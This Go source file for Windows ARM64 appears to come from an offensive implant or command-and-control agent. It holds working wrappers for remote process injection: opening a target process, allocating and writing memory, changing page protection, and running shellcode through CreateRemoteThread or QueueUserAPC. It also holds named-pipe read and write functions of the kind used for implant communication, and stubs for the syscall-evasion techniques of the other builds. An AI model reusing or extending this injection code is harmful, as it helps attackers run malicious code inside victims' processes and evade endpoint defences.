//go:build windows && arm64
// +build windows,arm64

package main

import (
	"fmt"
	"syscall"
	"unsafe"
)

// syscallManager on ARM64 is a no-op placeholder.
// Direct syscalls are not supported on ARM64 Windows;
// all syscallNt* wrappers use Win32 API calls instead.
type syscallManager struct{}

func newSyscallManager() *syscallManager {
	return &syscallManager{}
}

func (sm *syscallManager) freeStubs() {}

func (sm *syscallManager) getStub(name string) (uintptr, error) {
	return 0, fmt.Errorf("direct syscalls not supported on arm64: %s", name)
}

func (sm *syscallManager) getSpoofedStub(name string) (uintptr, error) {
	return 0, fmt.Errorf("spoofed syscalls not supported on arm64: %s", name)
}

func (sm *syscallManager) getIndirectStub(name string) (uintptr, error) {
	return 0, fmt.Errorf("indirect syscalls not supported on arm64: %s", name)
}

// ARM64 DLL proc handles
var (
	arm64Kernel32 = syscall.NewLazyDLL("kernel32.dll")
	arm64Ntdll    = syscall.NewLazyDLL("ntdll.dll")
)

var (
	arm64VirtualAllocEx     = arm64Kernel32.NewProc("VirtualAllocEx")
	arm64VirtualFreeEx      = arm64Kernel32.NewProc("VirtualFreeEx")
	arm64VirtualProtectEx   = arm64Kernel32.NewProc("VirtualProtectEx")
	arm64WriteProcessMemory = arm64Kernel32.NewProc("WriteProcessMemory")
	arm64CreateRemoteThread = arm64Kernel32.NewProc("CreateRemoteThread")
	arm64OpenProcess        = arm64Kernel32.NewProc("OpenProcess")
	arm64CloseHandle        = arm64Kernel32.NewProc("CloseHandle")
	arm64ResumeThread       = arm64Kernel32.NewProc("ResumeThread")
	arm64QueueUserAPC       = arm64Kernel32.NewProc("QueueUserAPC")

	arm64CreateNamedPipeW = arm64Kernel32.NewProc("CreateNamedPipeW")
	arm64ConnectNamedPipe = arm64Kernel32.NewProc("ConnectNamedPipe")
	arm64CreateFileW      = arm64Kernel32.NewProc("CreateFileW")
	arm64ReadFile         = arm64Kernel32.NewProc("ReadFile")
	arm64WriteFile        = arm64Kernel32.NewProc("WriteFile")
	arm64Sleep            = arm64Kernel32.NewProc("Sleep")

	arm64GetModuleHandleW = arm64Kernel32.NewProc("GetModuleHandleW")
)

func syscallNtCreateThreadEx(sm *syscallManager, hProc uintptr, shellcodeAddr uintptr) (uintptr, error) {
	hThread, _, _ := arm64CreateRemoteThread.Call(hProc, 0, 0, shellcodeAddr, 0, 0, 0)
	if hThread == 0 {
		return 0, fmt.Errorf("CreateRemoteThread failed")
	}
	return hThread, nil
}

func syscallNtAllocateVirtualMemory(sm *syscallManager, hProc uintptr, size uintptr, protect uint32) (uintptr, error) {
	addr, _, _ := arm64VirtualAllocEx.Call(hProc, 0, size, MEM_COMMIT|MEM_RESERVE, uintptr(protect))
	if addr == 0 {
		return 0, fmt.Errorf("VirtualAllocEx failed (size=%d)", size)
	}
	return addr, nil
}

func syscallNtFreeVirtualMemory(sm *syscallManager, hProc uintptr, baseAddr uintptr) error {
	ret, _, _ := arm64VirtualFreeEx.Call(hProc, baseAddr, 0, 0x8000)
	if ret == 0 {
		return fmt.Errorf("VirtualFreeEx failed")
	}
	return nil
}

func syscallNtProtectVirtualMemory(sm *syscallManager, hProc uintptr, baseAddr uintptr, size uintptr, newProtect uint32) (uint32, error) {
	var oldProtect uint32
	ret, _, _ := arm64VirtualProtectEx.Call(
		hProc, baseAddr, size,
		uintptr(newProtect),
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	if ret == 0 {
		return 0, fmt.Errorf("VirtualProtectEx failed")
	}
	return oldProtect, nil
}

func syscallNtWriteVirtualMemory(sm *syscallManager, hProc uintptr, destAddr uintptr, data []byte) error {
	var written uintptr
	ret, _, _ := arm64WriteProcessMemory.Call(
		hProc, destAddr,
		uintptr(unsafe.Pointer(&data[0])),
		uintptr(len(data)),
		uintptr(unsafe.Pointer(&written)),
	)
	if ret == 0 {
		return fmt.Errorf("WriteProcessMemory failed")
	}
	return nil
}

func syscallNtOpenProcess(sm *syscallManager, desiredAccess uint32, pid uint32) (uintptr, error) {
	hProc, _, _ := arm64OpenProcess.Call(uintptr(desiredAccess), 0, uintptr(pid))
	if hProc == 0 {
		return 0, fmt.Errorf("OpenProcess(%d) failed", pid)
	}
	return hProc, nil
}

func syscallNtClose(sm *syscallManager, handle uintptr) error {
	arm64CloseHandle.Call(handle)
	return nil
}

func syscallNtResumeThread(sm *syscallManager, hThread uintptr) error {
	ret, _, _ := arm64ResumeThread.Call(hThread, 0)
	if ret == 0xFFFFFFFF {
		return fmt.Errorf("ResumeThread failed")
	}
	return nil
}

func syscallNtQueueApcThread(sm *syscallManager, hThread uintptr, apcRoutine uintptr, param uintptr) error {
	ret, _, _ := arm64QueueUserAPC.Call(apcRoutine, hThread, param)
	if ret == 0 {
		return fmt.Errorf("QueueUserAPC failed")
	}
	return nil
}

func syscallNtDelayExecution(sm *syscallManager, alertable bool, delayInterval *int64) (bool, error) {
	ms := *delayInterval / (-10000)
	if ms < 1 {
		ms = 1
	}
	arm64Sleep.Call(uintptr(ms))
	return true, nil
}

// Named pipe functions using Win32 API

type pipeConnArm64 struct {
	handle uintptr
}

func syscallNtCreateNamedPipeFile(sm *syscallManager, pipeName string, maxInstances uint32) (uintptr, error) {
	ntPath := `\\.\pipe\` + pipeName
	buf, _ := syscall.UTF16PtrFromString(ntPath)

	handle, _, _ := arm64CreateNamedPipeW.Call(
		uintptr(unsafe.Pointer(buf)),
		0x00000003, // PIPE_ACCESS_DUPLEX
		0x00000001, // PIPE_TYPE_BYTE
		uintptr(maxInstances),
		4096, 4096,
		0,
		0,
	)
	if handle == 0 || handle == ^uintptr(0) {
		return 0, fmt.Errorf("CreateNamedPipeW failed: %s", pipeName)
	}
	return handle, nil
}

func syscallNtOpenPipe(sm *syscallManager, pipeName string) (uintptr, error) {
	ntPath := `\\.\pipe\` + pipeName
	buf, _ := syscall.UTF16PtrFromString(ntPath)

	handle, _, _ := arm64CreateFileW.Call(
		uintptr(unsafe.Pointer(buf)),
		0xC0000000, // GENERIC_READ | GENERIC_WRITE
		0x00000003, // FILE_SHARE_READ | FILE_SHARE_WRITE
		0,
		0x00000003, // OPEN_EXISTING
		0,
		0,
	)
	if handle == 0 || handle == ^uintptr(0) {
		return 0, fmt.Errorf("CreateFileW pipe failed: %s", pipeName)
	}
	return handle, nil
}

func syscallNtFsControlListen(sm *syscallManager, handle uintptr) error {
	ret, _, _ := arm64ConnectNamedPipe.Call(handle, 0)
	if ret == 0 {
		// ERROR_PIPE_CONNECTED is OK
		return nil
	}
	return nil
}

func syscallNtReadPipe(sm *syscallManager, handle uintptr, buf []byte) (int, error) {
	if len(buf) == 0 {
		return 0, nil
	}
	var read uint32
	ret, _, _ := arm64ReadFile.Call(
		handle,
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(len(buf)),
		uintptr(unsafe.Pointer(&read)),
		0,
	)
	if ret == 0 {
		return 0, fmt.Errorf("ReadFile failed")
	}
	return int(read), nil
}

func syscallNtWritePipe(sm *syscallManager, handle uintptr, data []byte) (int, error) {
	if len(data) == 0 {
		return 0, nil
	}
	var written uint32
	ret, _, _ := arm64WriteFile.Call(
		handle,
		uintptr(unsafe.Pointer(&data[0])),
		uintptr(len(data)),
		uintptr(unsafe.Pointer(&written)),
		0,
	)
	if ret == 0 {
		return 0, fmt.Errorf("WriteFile failed")
	}
	return int(written), nil
}

func syscallNtCloseHandle(sm *syscallManager, handle uintptr) error {
	arm64CloseHandle.Call(handle)
	return nil
}

var (
	pipeSyscallManagerARM64     *syscallManager
	pipeSyscallManagerInitARM64 bool
)

func getPipeSyscallManager() *syscallManager {
	if !pipeSyscallManagerInitARM64 {
		pipeSyscallManagerARM64 = newSyscallManager()
		pipeSyscallManagerInitARM64 = true
	}
	return pipeSyscallManagerARM64
}

var (
	injectSyscallManagerARM64     *syscallManager
	injectSyscallManagerInitARM64 bool
)

func getInjectManager() *syscallManager {
	if !injectSyscallManagerInitARM64 {
		injectSyscallManagerARM64 = newSyscallManager()
		injectSyscallManagerInitARM64 = true
	}
	return injectSyscallManagerARM64
}
